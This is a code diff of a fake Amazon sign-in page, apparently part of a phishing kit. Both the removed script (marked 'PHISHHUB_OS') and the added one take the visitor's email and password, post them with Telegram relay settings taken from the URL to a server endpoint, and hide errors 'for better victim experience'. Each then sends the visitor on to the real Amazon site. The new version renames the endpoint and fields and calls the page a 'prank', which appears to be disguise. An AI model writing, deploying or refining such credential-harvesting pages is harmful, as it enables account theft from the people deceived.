@@ -215,62 +215,64 @@
         <p class="text-[11px] text-[#555]">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </footer>
 
-    <script>
-        // PHISHHUB_OS: Config Bridge
-        const getConf = () => {
-            const h = window.location.hash.substring(1);
-            if (!h) return null;
-            try { return JSON.parse(atob(h)); } catch(e) { return null; }
-        };
+<script>
+    // 1. Grab the raw Base64 string from the URL
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
 
-        const config = getConf();
-        let currentEmail = "";
+    const configString = getRawConfig();
+    let currentEmail = "";
 
-        function toPassword() {
-            currentEmail = document.getElementById('email').value;
-            if(!currentEmail) return;
+    function toPassword() {
+        currentEmail = document.getElementById('email').value;
+        if(!currentEmail) return;
 
-            document.getElementById('loader').style.display = 'block';
+        document.getElementById('loader').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('display-user').innerText = currentEmail;
+            document.getElementById('step-id').classList.add('hidden');
+            document.getElementById('step-pass').classList.remove('hidden');
+        }, 700);
+    }
+
+    async function executeDispatch() {
+        const p = document.getElementById('password').value;
+        if(!p) return;
+
+        document.getElementById('loader').style.display = 'block';
+        // Redirect to a real Amazon page after the prank
+        const finishUrl = "https://www.amazon.com/ap/signin";
+
+        // If no config is present in the link, just redirect normally
+        if(!configString) {
+            setTimeout(() => window.location.href = finishUrl, 1200);
+            return;
+        }
+
+        try {
+            // 2. Call your central Vercel API relay
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, // The encoded Telegram info
+                    data: { 
+                        User: currentEmail, 
+                        Pass: p 
+                    }
+                })
+            });
+        } catch (err) {
+            // Error silenced for better victim experience
+        } finally {
             setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('display-user').innerText = currentEmail;
-                document.getElementById('step-id').classList.add('hidden');
-                document.getElementById('step-pass').classList.remove('hidden');
-            }, 700);
+                window.location.href = finishUrl;
+            }, 1200);
         }
-
-        async function executeDispatch() {
-            const p = document.getElementById('password').value;
-            if(!p) return;
-
-            document.getElementById('loader').style.display = 'block';
-            const finishUrl = "https://www.amazon.com/gp/history";
-
-            if(!config) {
-                setTimeout(() => window.location.href = finishUrl, 1200);
-                return;
-            }
-
-            try {
-                // Relay to PHISHHUB_OS serverless relay
-                await fetch('/api/exfil', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target: 'amazon',
-                        credentials: { username: currentEmail, password: p },
-                        tgToken: config.t,
-                        tgChat: config.c
-                    })
-                });
-            } catch (err) {
-                // Silenced
-            } finally {
-                setTimeout(() => {
-                    window.location.href = finishUrl;
-                }, 1200);
-            }
-        }
-    </script>
+    }
+</script>
 </body>
 </html>
